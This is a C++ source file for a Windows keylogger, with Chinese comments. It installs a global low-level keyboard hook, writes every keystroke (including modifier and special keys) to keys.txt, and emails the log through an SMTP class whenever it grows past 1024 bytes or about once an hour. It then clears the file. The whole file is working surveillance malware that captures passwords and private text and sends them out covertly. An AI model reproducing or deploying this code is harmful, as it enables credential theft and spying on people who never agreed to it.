#include "stdafx.h"
#include "KeyboardHook.h"
#include <time.h>


bool sendMail();
time_t lastTime;
time_t routineTime;
time_t returnTime;
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	ofstream out("keys.txt", ios::out | ios::app);
	if (time(NULL) - lastTime > 1)	//1秒间隔不输入插入换行符
		out << endl;
	//输出流，记录键值
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

	if (wParam == WM_KEYDOWN) {
		//按键被按下
		switch (p->vkCode) {
		case VK_RETURN: out << "<ENTER>";	
			{
				HANDLE fd = CreateFile(L"keys.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				WORD len = GetFileSize(fd, NULL);
				CloseHandle(fd);
				if (len > 1024) {
					if (sendMail()) {
						out.close();
						ofstream out("keys.txt", ios::out);
					}
				}
			};
		break;
		case VK_BACK: out << "<BK>" ; break;
		case VK_TAB: out << "<TAB>" ; break;
		case VK_CLEAR: out << "<CLEAR>" ; break;
		case VK_SHIFT: out << "<SHIFT DOWN>" ; break;
		case VK_CONTROL: out << "<CTRL DOWN>" ; break;
		case VK_MENU: out << "<ALT DOWN>" ; break;
		case VK_PAUSE: out << "<PAUSE>" ; break;
		case VK_CAPITAL: out << "<CAPS LOCK>" ; break;
		case VK_ESCAPE: out << "<ESC>" ; break;
		case VK_SPACE: out << " " ; break;
		case VK_PRIOR: out << "<PAGE UP>" ; break;
		case VK_NEXT: out << "<PAGE DOWN>" ; break;
		case VK_END: out << "<END>" ; break;
		case VK_HOME: out << "<HOME>" ; break;
		case VK_LEFT: out << "<LEFT ARROW>" ; break;
		case VK_UP: out << "<UP ARROW>" ; break;
		case VK_RIGHT: out << "<RIGHT ARROW>" ; break;
		case VK_DOWN: out << "<DOWN ARROW>" ; break;
		case VK_SELECT: out << "<SELECT>" ; break;
		case VK_PRINT: out << "<PRINT>" ; break;
		case VK_EXECUTE: out << "<EXECUTE>" ; break;
		case VK_SNAPSHOT: out << "<PRINT SCREEN>" ; break;
		case VK_INSERT: out << "<INSERT>" ; break;
		case VK_DELETE: out << "<DEL>" ; break;
		case VK_HELP: out << "<HELP>" ; break;
		case VK_LWIN: out << "<Left Windows key DOWN>" ; break;
		case VK_RWIN: out << "<Right Windows key DOWN>" ; break;
		case VK_APPS: out << "<Applications key>" ; break;
		case VK_SLEEP: out << "<Computer Sleep key>" ; break;
		case VK_NUMPAD0: out << "<0>"; break;
		case VK_NUMPAD1: out << "<1>"; break;
		case VK_NUMPAD2: out << "<2>"; break;
		case VK_NUMPAD3: out << "<3>"; break;
		case VK_NUMPAD4: out << "<4>"; break;
		case VK_NUMPAD5: out << "<5>"; break;
		case VK_NUMPAD6: out << "<6>"; break;
		case VK_NUMPAD7: out << "<7>"; break;
		case VK_NUMPAD8: out << "<8>"; break;
		case VK_NUMPAD9: out << "<9>"; break;
		case VK_MULTIPLY: out << " *"; break;
		case VK_ADD: out << " +"; break;
		case VK_SEPARATOR: out << "<Separator key>" ; break;
		case VK_SUBTRACT: out << " -"; break;
		case VK_DECIMAL: out << " ."; break;
		case VK_DIVIDE: out << " /"; break;
		case VK_F1: out << "<F1>" ; break;
		case VK_F2: out << "<F2>" ; break;
		case VK_F3: out << "<F3>" ; break;
		case VK_F4: out << "<F4>" ; break;
		case VK_F5: out << "<F5>" ; break;
		case VK_F6: out << "<F6>" ; break;
		case VK_F7: out << "<F7>" ; break;
		case VK_F8: out << "<F8>" ; break;
		case VK_F9: out << "<F9>" ; break;
		case VK_F10: out << "<F10>" ; break;
		case VK_F11: out << "<F11>" ; break;
		case VK_F12: out << "<F12>" ; break;
		case VK_NUMLOCK: out << "<NUM LOCK>" ; break;
		case VK_SCROLL: out << "<SCROLL LOCK>" ; break;
		case VK_LSHIFT: out << "<Left SHIFT DOWN>" ; break;
		case VK_RSHIFT: out << "<Right SHIFT DOWN>" ; break;
		case VK_LCONTROL: out << "<Left CONTROL DOWN>" ; break;
		case VK_RCONTROL: out << "<Right CONTROL DOWN>" ; break;
		case VK_LMENU: out << "<Left MENU>" ; break;
		case VK_RMENU: out << "<Right MENU>" ; break;
		case VK_BROWSER_BACK: out << "<Browser Back key>" ; break;
		case VK_BROWSER_FORWARD: out << "<Browser Forward key>" ; break;
		case VK_BROWSER_REFRESH: out << "<Browser Refresh key>" ; break;
		case VK_BROWSER_STOP: out << "<Browser Stop key>" ; break;
		case VK_BROWSER_SEARCH: out << "<Browser Search key >" ; break;
		case VK_BROWSER_FAVORITES: out << "<Browser Favorites key>" ; break;
		case VK_BROWSER_HOME: out << "<Browser Start and Home key>" ; break;
		case VK_VOLUME_MUTE: out << "<Volume Mute key>" ; break;
		case VK_VOLUME_DOWN: out << "<Volume Down key>" ; break;
		case VK_VOLUME_UP: out << "<Volume Up key>" ; break;
		case VK_MEDIA_NEXT_TRACK: out << "<Next Track key>" ; break;
		case VK_MEDIA_PREV_TRACK: out << "<Previous Track key>" ; break;
		case VK_MEDIA_STOP: out << "<Stop Media key>" ; break;
		case VK_MEDIA_PLAY_PAUSE: out << "<Play/Pause Media key>" ; break;
		case VK_LAUNCH_MAIL: out << "<Start Mail key>" ; break;
		case VK_LAUNCH_MEDIA_SELECT: out << "<Select Media key>" ; break;
		case VK_LAUNCH_APP1: out << "<Start Application 1 key>" ; break;
		case VK_LAUNCH_APP2: out << "<Start Application 2 key>" ; break;
		case VK_OEM_1: out << "<;:' key >" ; break;
		case VK_OEM_PLUS: out << " +"; break;
		case VK_OEM_COMMA: out << " ,"; break;
		case VK_OEM_MINUS: out << " -"; break;
		case VK_OEM_PERIOD: out << " ."; break;
		case VK_OEM_2: out << "</?' key >" ; break;
		case VK_OEM_3: out << "<`~' key >" ; break;
		case VK_OEM_4: out << "<[{' key>" ; break;
		case VK_OEM_5: out << "<\|' key>" ; break;
		case VK_OEM_6: out << "<]}' key>" ; break;
		case VK_OEM_7: out << "<single-quote/double-quote' key>" ; break;
		case VK_OEM_CLEAR: out << "<Clear>" ; break;

		default:
			out << char(tolower(p->vkCode));
		}
	}

	if (wParam == WM_KEYUP)

	{
		//按键被释放

		switch (p->vkCode)
		{
		case VK_SHIFT: out << "<SHIFT UP>" ; break;
		case VK_CONTROL: out << "<CTRL UP>" ; break;
		case VK_MENU: out << "<ALT UP>" ; break;
		case VK_LSHIFT: out << "<Left SHIFT UP>" ; break;
		case VK_RSHIFT: out << "<Right SHIFT UP>" ; break;
		case VK_LCONTROL: out << "<Left CONTROL UP>" ; break;
		case VK_RCONTROL: out << "<Right CONTROL UP>" ; break;
		case VK_LWIN: out << "<Left Windows key UP>" ; break;
		case VK_RWIN: out << "<Right Windows key UP>" ; break;

		default: break;
		}
	}
	if (time(NULL) - routineTime > 3600)	//约一小时发送附带键盘记录文件邮件
		if (sendMail()) {
			out.close();
			ofstream out("keys.txt", ios::out);
			routineTime = time(NULL);
		};
	returnTime = time(NULL);

	out.close(); //关闭流
	lastTime = time(NULL);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
	//不是我们关注的消息，交给下一个钩子处 //理:CallNextHookEx(). 本例中因为只安装一个钩子，所以调用该
	//函数是把消息交给窗口的消息处理函数。

}
KeyboardHook::KeyboardHook(HINSTANCE hInstance)
{
	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, 0);
	lastTime = time(NULL);
	returnTime = time(NULL);
	routineTime = time(NULL);
}


KeyboardHook::~KeyboardHook()
{
}

bool sendMail()
{
	CSmtp sendMail;
	if (sendMail.Send())
		return true;
	return false;
}
